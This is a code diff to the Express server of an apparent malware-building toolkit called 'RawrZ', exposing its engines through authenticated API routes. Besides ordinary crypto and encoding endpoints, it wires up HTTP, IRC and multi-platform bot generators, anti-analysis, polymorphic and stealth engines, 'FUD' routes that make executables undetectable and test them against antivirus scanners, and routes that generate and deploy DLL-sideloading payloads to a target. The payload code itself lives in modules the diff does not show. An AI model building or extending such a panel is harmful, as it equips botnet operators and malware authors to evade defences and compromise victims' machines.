@@ -80,168 +80,38 @@ const redShells = require('./src/engines/red-shells');
 const beaconismDLL = require('./src/engines/beaconism-dll-sideloading');
 const reverseEngineering = require('./src/engines/reverse-engineering');
 
-// Real Module Implementations
+// Direct Engine Access - No Wrappers, Full Functionality
 const realModules = {
-    // Core Engines
-    rawrzEngine: {
-        initialize: async () => await rawrzEngine.initialize(),
-        getStatus: async () => await rawrzEngine.getStatus(),
-        loadModule: async (moduleName) => await rawrzEngine.loadModule(moduleName),
-        getAvailableModules: async () => await rawrzEngine.getAvailableModules(),
-        getSettings: async () => await rawrzEngine.getSettings(),
-        getPanelConfig: async () => await rawrzEngine.getPanelConfig(),
-        getAvailableEndpoints: async () => await rawrzEngine.getAvailableEndpoints(),
-        getCLICommands: async () => await rawrzEngine.getCLICommands()
-    },
+    // Core Engines - Direct Access
+    rawrzEngine: rawrzEngine,
+    rawrzEngine2: rawrzEngine2,
+
+    // Bot Generators - Direct Access
+    httpBotGenerator: httpBotGenerator,
+    httpBotManager: HTTPBotManager,
+    ircBotGenerator: ircBotGenerator,
+
+    multiPlatformBotGenerator: multiPlatformBotGenerator,
+
+    // Security Engines - Direct Access
+    antiAnalysis: antiAnalysis,
+    advancedAntiAnalysis: advancedAntiAnalysis,
+    hotPatchers: hotPatchers,
+
+    // Analysis Engines - Direct Access
+    malwareAnalysis: malwareAnalysis,
+    digitalForensics: digitalForensics,
+    jottiScanner: JottiScanner,
     
-    rawrzEngine2: {
-        initialize: async () => await rawrzEngine2.initialize(),
-        getStatus: async () => await rawrzEngine2.getStatus(),
-        executeOperation: async (operation, options) => await rawrzEngine2.executeOperation(operation, options)
-    },
+    privateVirusScanner: PrivateVirusScanner,
+    cveAnalysisEngine: cveAnalysisEngine,
 
-    // Bot Generators
-    httpBotGenerator: {
-        initialize: async () => await httpBotGenerator.initialize(),
-        getStatus: async () => await httpBotGenerator.getStatus(),
-        generateBot: async (options) => await httpBotGenerator.generateBot(options),
-        getBotTemplates: async () => await httpBotGenerator.getBotTemplates()
-    },
-
-    httpBotManager: {
-        initialize: async () => await HTTPBotManager.initialize(),
-        getStatus: async () => await HTTPBotManager.getStatus(),
-        createBot: async (options) => await HTTPBotManager.createBot(options),
-        getActiveBots: async () => await HTTPBotManager.getActiveBots()
-    },
-
-    ircBotGenerator: {
-        initialize: async () => await ircBotGenerator.initialize(),
-        getStatus: async () => await ircBotGenerator.getStatus(),
-        generateBot: async (options) => await ircBotGenerator.generateBot(options),
-        getSupportedLanguages: async () => await ircBotGenerator.getSupportedLanguages()
-    },
-
-    multiPlatformBotGenerator: {
-        initialize: async () => await multiPlatformBotGenerator.initialize(),
-        getStatus: async () => await multiPlatformBotGenerator.getStatus(),
-        generateMultiPlatformBot: async (platforms, options) => await multiPlatformBotGenerator.generateMultiPlatformBot(platforms, options)
-    },
-
-    // Security Engines
-    antiAnalysis: {
-        initialize: async () => await antiAnalysis.initialize(),
-        getStatus: async () => await antiAnalysis.getStatus(),
-        runAntiAnalysis: async (options) => await antiAnalysis.runAntiAnalysis(options),
-        getTechniques: async () => await antiAnalysis.getTechniques()
-    },
-
-    advancedAntiAnalysis: {
-        initialize: async () => await advancedAntiAnalysis.initialize(),
-        getStatus: async () => await advancedAntiAnalysis.getStatus(),
-        runAntiAnalysis: async (options) => await advancedAntiAnalysis.runAntiAnalysis(options),
-        getTechniques: async () => await advancedAntiAnalysis.getTechniques()
-    },
-
-    hotPatchers: {
-        initialize: async () => await hotPatchers.initialize(),
-        getStatus: async () => await hotPatchers.getStatus(),
-        applyPatch: async (target, patchType, options) => await hotPatchers.applyPatch(target, patchType, options),
-        revertPatch: async (patchId) => await hotPatchers.revertPatch(patchId),
-        getActivePatches: async () => await hotPatchers.getActivePatches()
-    },
-
-    // Analysis Engines
-    malwareAnalysis: {
-        initialize: async () => await malwareAnalysis.initialize(),
-        getStatus: async () => await malwareAnalysis.getStatus(),
-        analyzeFile: async (file, options) => await malwareAnalysis.analyzeFile(file, options)
-    },
-
-    digitalForensics: {
-        initialize: async () => await digitalForensics.initialize(),
-        getStatus: async () => await digitalForensics.getStatus(),
-        analyzeFileSystem: async (target, options) => await digitalForensics.analyzeFileSystem(target, options)
-    },
-    
-    jottiScanner: {
-        initialize: async () => await JottiScanner.initialize(),
-        getStatus: async () => await JottiScanner.getStatus(),
-        scanFile: async (filePath, options) => await JottiScanner.scanFile(filePath, options)
-    },
-    
-    privateVirusScanner: {
-        initialize: async () => await PrivateVirusScanner.initialize(),
-        getStatus: async () => await PrivateVirusScanner.getStatus(),
-        scanFile: async (filePath, options) => await PrivateVirusScanner.scanFile(filePath, options)
-    },
-
-    cveAnalysisEngine: {
-        initialize: async () => await cveAnalysisEngine.initialize(),
-        getStatus: async () => await cveAnalysisEngine.getStatus(),
-        analyzeCVE: async (cveId) => await cveAnalysisEngine.analyzeCVE(cveId),
-        searchCVEs: async (query, options) => await cveAnalysisEngine.searchCVEs(query, options),
-        getSettings: async () => await cveAnalysisEngine.getSettings(),
-        getPanelConfig: async () => await cveAnalysisEngine.getPanelConfig(),
-        getAvailableEndpoints: async () => await cveAnalysisEngine.getAvailableEndpoints(),
-        getCLICommands: async () => await cveAnalysisEngine.getCLICommands()
-    },
-
-    // Crypto Engines
-    advancedCrypto: {
-        initialize: async () => await advancedCrypto.initialize(),
-        getStatus: async () => await advancedCrypto.getStatus(),
-        encrypt: async (data, options) => await advancedCrypto.encrypt(data, options),
-        decrypt: async (data, options) => await advancedCrypto.decrypt(data, options),
-        setOpenSSLMode: async (enabled) => await advancedCrypto.setOpenSSLMode(enabled),
-        setCustomAlgorithms: async (enabled) => await advancedCrypto.setCustomAlgorithms(enabled),
-        getSettings: async () => await advancedCrypto.getSettings(),
-        getPanelConfig: async () => await advancedCrypto.getPanelConfig(),
-        getAvailableEndpoints: async () => await advancedCrypto.getAvailableEndpoints(),
-        getCLICommands: async () => await advancedCrypto.getCLICommands()
-    },
-
-    burnerEncryption: {
-        initialize: async () => await burnerEncryption.initialize(),
-        getStatus: async () => await burnerEncryption.getStatus(),
-        encrypt: async (data, options) => await burnerEncryption.encrypt(data, options),
-        decrypt: async (data, options) => await burnerEncryption.decrypt(data, options),
-        getSettings: async () => await burnerEncryption.getSettings(),
-        getPanelConfig: async () => await burnerEncryption.getPanelConfig(),
-        getAvailableEndpoints: async () => await burnerEncryption.getAvailableEndpoints(),
-        getCLICommands: async () => await burnerEncryption.getCLICommands()
-    },
-
-    compressionEngine: {
-        initialize: async () => await compressionEngine.initialize(),
-        getStatus: async () => await compressionEngine.getStatus(),
-        compress: async (data, options) => await compressionEngine.compress(data, options),
-        decompress: async (data, options) => await compressionEngine.decompress(data, options),
-        getSettings: async () => await compressionEngine.getSettings(),
-        getPanelConfig: async () => await compressionEngine.getPanelConfig(),
-        getAvailableEndpoints: async () => await compressionEngine.getAvailableEndpoints(),
-        getCLICommands: async () => await compressionEngine.getCLICommands()
-    },
-
-    polymorphicEngine: {
-        initialize: async () => await polymorphicEngine.initialize(),
-        getStatus: async () => await polymorphicEngine.getStatus(),
-        transform: async (data, options) => await polymorphicEngine.transform(data, options),
-        getSettings: async () => await polymorphicEngine.getSettings(),
-        getPanelConfig: async () => await polymorphicEngine.getPanelConfig(),
-        getAvailableEndpoints: async () => await polymorphicEngine.getAvailableEndpoints(),
-        getCLICommands: async () => await polymorphicEngine.getCLICommands()
-    },
-
-    stealthEngine: {
-        initialize: async () => await stealthEngine.initialize(),
-        getStatus: async () => await stealthEngine.getStatus(),
-        applyStealth: async (data, options) => await stealthEngine.applyStealth(data, options),
-        getSettings: async () => await stealthEngine.getSettings(),
-        getPanelConfig: async () => await stealthEngine.getPanelConfig(),
-        getAvailableEndpoints: async () => await stealthEngine.getAvailableEndpoints(),
-        getCLICommands: async () => await stealthEngine.getCLICommands()
-    },
+    // Crypto Engines - Direct Access
+    advancedCrypto: advancedCrypto,
+    burnerEncryption: burnerEncryption,
+    compressionEngine: compressionEngine,
+    polymorphicEngine: polymorphicEngine,
+    stealthEngine: stealthEngine,
     
     camelliaAssembly: {
         initialize: async () => {
@@ -691,17 +561,17 @@ app.use(helmet());
 app.use(cors());
 // Enhanced JSON parsing with error handling
 app.use(express.json({ 
-    limit: '50mb',
-    verify: (req, res, buf, encoding) => {
-        try {
-            JSON.parse(buf);
-        } catch (e) {
-            console.error('Invalid JSON received:', buf.toString());
-            res.status(400).json({ error: 'Invalid JSON format' });
-            return;
-        }
-    }
+    limit: '50mb'
 }));
+
+// Error handler for JSON parsing errors
+app.use((error, req, res, next) => {
+    if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
+        console.error('JSON parsing error:', error.message);
+        return res.status(400).json({ error: 'Invalid JSON format' });
+    }
+    next(error);
+});
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // Authentication middleware
@@ -1002,6 +872,410 @@ app.post('/api/engines/:engine/initialize', requireAuth, async (req, res) => {
             return res.status(404).json({ error: 'Engine not found' });
         }
         const result = await realModules[engine].initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING CRYPTO ENDPOINTS =====
+app.post('/encrypt', requireAuth, async (req, res) => {
+    try {
+        const { algorithm, input, extension } = req.body || {};
+        if (!algorithm || !input) {
+            return res.status(400).json({ error: 'algorithm and input are required' });
+        }
+        
+        const result = await realModules.advancedCrypto.encrypt(input, algorithm, { extension });
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/decrypt', requireAuth, async (req, res) => {
+    try {
+        const { algorithm, input, key, iv } = req.body || {};
+        if (!algorithm || !input || !key) {
+            return res.status(400).json({ error: 'algorithm, input, and key are required' });
+        }
+        
+        const result = await realModules.advancedCrypto.decrypt(input, algorithm, key, iv);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/keygen', requireAuth, async (req, res) => {
+    try {
+        const { algorithm, length, save } = req.body || {};
+        if (!algorithm) {
+            return res.status(400).json({ error: 'algorithm is required' });
+        }
+        
+        const result = await realModules.advancedCrypto.generateKey(algorithm, length, save);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/hash', requireAuth, async (req, res) => {
+    try {
+        const { input, algorithm } = req.body || {};
+        if (!input || !algorithm) {
+            return res.status(400).json({ error: 'input and algorithm are required' });
+        }
+        
+        const result = await realModules.advancedCrypto.hash(input, algorithm);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/random', requireAuth, async (req, res) => {
+    try {
+        const { length } = req.body || {};
+        if (!length) {
+            return res.status(400).json({ error: 'length is required' });
+        }
+        
+        const result = await realModules.advancedCrypto.generateRandom(length);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/uuid', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedCrypto.generateUUID();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/password', requireAuth, async (req, res) => {
+    try {
+        const { length, includeSpecial } = req.body || {};
+        if (!length) {
+            return res.status(400).json({ error: 'length is required' });
+        }
+        
+        const result = await realModules.advancedCrypto.generatePassword(length, includeSpecial);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING ENCODING ENDPOINTS =====
+app.post('/base64encode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = Buffer.from(input).toString('base64');
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/base64decode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = Buffer.from(input, 'base64').toString();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/hexencode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = Buffer.from(input).toString('hex');
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/hexdecode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = Buffer.from(input, 'hex').toString();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/urlencode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = encodeURIComponent(input);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/urldecode', requireAuth, async (req, res) => {
+    try {
+        const { input } = req.body || {};
+        if (!input) {
+            return res.status(400).json({ error: 'input is required' });
+        }
+        
+        const result = decodeURIComponent(input);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING CRYPTO OPERATION ENDPOINTS =====
+app.post('/sign', requireAuth, async (req, res) => {
+    try {
+        const { input, privateKey } = req.body || {};
+        if (!input || !privateKey) {
+            return res.status(400).json({ error: 'input and privateKey are required' });
+        }
+        
+        const result = await realModules.advancedCrypto.sign(input, privateKey);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/verify', requireAuth, async (req, res) => {
+    try {
+        const { input, signature, publicKey } = req.body || {};
+        if (!input || !signature || !publicKey) {
+            return res.status(400).json({ error: 'input, signature, and publicKey are required' });
+        }
+        
+        const result = await realModules.advancedCrypto.verify(input, signature, publicKey);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING NETWORK ENDPOINTS =====
+app.post('/traceroute', requireAuth, async (req, res) => {
+    try {
+        const { host } = req.body || {};
+        if (!host) {
+            return res.status(400).json({ error: 'host is required' });
+        }
+        
+        const result = await realModules.networkTools.traceroute(host);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/whois', requireAuth, async (req, res) => {
+    try {
+        const { domain } = req.body || {};
+        if (!domain) {
+            return res.status(400).json({ error: 'domain is required' });
+        }
+        
+        const result = await realModules.networkTools.whois(domain);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING SYSTEM ENDPOINTS =====
+app.get('/sysinfo', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.healthMonitor.getSystemInfo();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/processes', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.healthMonitor.getProcessList();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/time', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            timestamp: new Date().toISOString(),
+            unix: Date.now(),
+            local: new Date().toString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING FILE OPERATION ENDPOINTS =====
+app.post('/fileops', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.fileOperations.executeOperation(req.body);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/files', requireAuth, async (req, res) => {
+    try {
+        const { path } = req.query;
+        const result = await realModules.fileOperations.listFiles(path || '.');
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING ANALYSIS ENDPOINTS =====
+app.post('/analyze', requireAuth, async (req, res) => {
+    try {
+        const { input, analysisType } = req.body || {};
+        if (!input || !analysisType) {
+            return res.status(400).json({ error: 'input and analysisType are required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.analyze(input, analysisType);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/validate', requireAuth, async (req, res) => {
+    try {
+        const { input, type } = req.body || {};
+        if (!input || !type) {
+            return res.status(400).json({ error: 'input and type are required' });
+        }
+        
+        const result = await realModules.implementationChecker.validate(input, type);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/textops', requireAuth, async (req, res) => {
+    try {
+        const { operation, input } = req.body || {};
+        if (!operation || !input) {
+            return res.status(400).json({ error: 'operation and input are required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.textOperation(operation, input);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/math', requireAuth, async (req, res) => {
+    try {
+        const { expression } = req.body || {};
+        if (!expression) {
+            return res.status(400).json({ error: 'expression is required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.evaluateMath(expression);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING FUD ENDPOINTS =====
+app.post('/fud/generate', requireAuth, async (req, res) => {
+    try {
+        const { target, level = 'basic' } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedFUDEngine.applyBasicFUD(target, 'exe', { level });
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/fud/test', requireAuth, async (req, res) => {
+    try {
+        const { target } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.jottiScanner.scanFile(target);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ===== MISSING BEACONISM ENDPOINTS =====
+app.post('/beaconism/generate', requireAuth, async (req, res) => {
+    try {
+        const { type, options } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        
+        const result = await realModules.beaconismDLL.generatePayload(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/beaconism/deploy', requireAuth, async (req, res) => {
+    try {
+        const { target, payload } = req.body || {};
+        if (!target || !payload) {
+            return res.status(400).json({ error: 'target and payload are required' });
+        }
+        
+        const result = await realModules.beaconismDLL.deployPayload(target, payload);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -4749,9 +5023,18 @@ app.get('/red-shells/list', requireAuth, async (req, res) => {
 // Beaconism endpoints
 app.post('/beaconism/generate', requireAuth, async (req, res) => {
     try {
-        const { options = {} } = req.body || {};
+        const { payloadType, target, evasion, payload, options = {} } = req.body || {};
         
-        const result = await realModules.beaconismDLL.generatePayload(options);
+        // Convert frontend format to options format
+        const requestOptions = {
+            ...options,
+            payloadType,
+            target,
+            evasion,
+            payload
+        };
+        
+        const result = await realModules.beaconismDLL.generatePayload(requestOptions);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -4953,6 +5236,33 @@ app.get('/implementation-check/status', requireAuth, async (req, res) => {
 });
 
 // OpenSSL Management endpoints
+app.get('/openssl/', requireAuth, async (req, res) => {
+    try {
+        const availableEngines = realModules.opensslManagement.engines ? 
+            Array.from(realModules.opensslManagement.engines.keys()) : [];
+        const totalAlgorithms = await realModules.opensslManagement.getAllAlgorithms();
+        
+        const result = {
+            message: "RawrZ OpenSSL Management API",
+            version: "1.0.0",
+            endpoints: {
+                algorithms: "/openssl/algorithms",
+                opensslAlgorithms: "/openssl/openssl-algorithms", 
+                customAlgorithms: "/openssl/custom-algorithms",
+                config: "/openssl/config",
+                status: "/openssl-management/status",
+                performance: "/openssl-management/performance",
+                report: "/openssl-management/report"
+            },
+            availableEngines: availableEngines,
+            totalAlgorithms: totalAlgorithms ? totalAlgorithms.length : 0
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
 app.get('/openssl/config', requireAuth, async (req, res) => {
     try {
         const result = await realModules.opensslManagement.getConfigSummary();
